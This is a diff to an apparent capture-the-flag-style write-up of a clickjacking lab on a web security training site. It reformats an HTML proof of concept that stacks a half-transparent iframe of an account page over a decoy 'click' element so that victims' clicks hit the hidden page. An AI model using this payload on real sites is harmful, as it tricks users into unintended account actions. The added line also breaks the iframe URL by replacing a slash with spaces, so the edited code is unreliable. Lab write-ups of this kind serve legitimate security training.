@@ -123,38 +123,38 @@ The user will see our fake page however, any clicks will be sent to the invisibl
 Our fake website:
 
 <p align="center">
-  <img src="/img/img4.png"><br/>
+  <img width=500 height=500 src="/img/img4.png"><br/>
 </p>
 
 Code:
 
 ```html
 <head>
-	<style>
-		#target_website {
-			position:relative;
-			width:400px;
-			height:700px;
-			 opacity:0.5;
-			z-index:2;
-			}
-		#decoy_website {
-			position:absolute;
-            top: 480px;
-            left: 70px;
-			width:300px;
-			height:400px;
-			z-index:1;
-			}
-	</style>
+  <style>
+    #target_website {
+      position:relative;
+      width:400px;
+      height:700px;
+      opacity:0.5;
+      z-index:2;
+    }
+    #decoy_website {
+      position:absolute;
+      top: 480px;
+      left: 70px;
+      width:300px;
+      height:400px;
+      z-index:1;
+    }
+  </style>
 </head>
 
 <body>
-	<div id="decoy_website">
-	<p>click</p>
-	</div>
-	<iframe id="target_website" src="https://0aa000c603d8752282c347e7009b00b5.web-security-academy.net/my-account">
-	</iframe>
+  <div id="decoy_website">
+  <p>click</p>
+  </div>
+  <iframe id="target_website" src="https://0aa000c603d8752282c347e7009b00b5.web-security-academy.net  my-account">
+  </iframe>
 </body>
 ```
 
